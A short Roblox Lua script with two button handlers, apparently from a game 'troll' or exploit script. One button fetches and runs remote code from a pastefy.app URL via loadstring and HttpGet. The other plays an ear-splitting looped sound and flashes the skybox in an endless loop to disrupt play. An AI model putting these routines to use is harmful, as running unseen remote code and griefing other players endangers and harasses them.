-- Button click handlers
TextButton4.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastefy.app/iF7TCeZw/raw",true))()
end)

TextButton.MouseButton1Click:Connect(function()
    -- This was made by Zer0EXE

	snoop = Instance.new("Sound", game.Workspace)
	snoop.Name = "snoop dugg?"
	snoop.SoundId = "rbxassetid://5300345098"
	snoop.Volume = 1500
	snoop.Looped = true
	snoop:Play()
	
	if game.Lighting:FindFirstChild("AnimatedSky") then return end

	local imageIds = {
		131395838,131395847,131395855,131395860,131395868,131395884,131395891,
		131395897,131395901,131395946,131395957,131395966,131395972,131395979,
		131395986,131395989,131395993,131395997,131396003,131396007,131396012,
		131396016,131396019,131396024,131396029,131396037,131396042,131396044,
		131396046,131396054,131396063,131396068,131396072,131396078,131396091,
		131396098,131396102,131396108,131396110,131396113,131396116,131396121,
		131396125,131396133,131396137,131396142,131396146,131396156,131396162,
		131396164,131396169,131396173,131396176,131396181,131396185,131396188,
		131396192
	}

	local sky = Instance.new("Sky")
	sky.Name = "AnimatedSky"
	sky.Parent = game.Lighting

	while true do
		for _, id in ipairs(imageIds) do
			local url = "http://www.roblox.com/asset/?id=" .. id
			sky.SkyboxBk = url
			sky.SkyboxDn = url
			sky.SkyboxFt = url
			sky.SkyboxLf = url
			sky.SkyboxRt = url
			sky.SkyboxUp = url
			wait(0.04)
			
		end
	end
end)

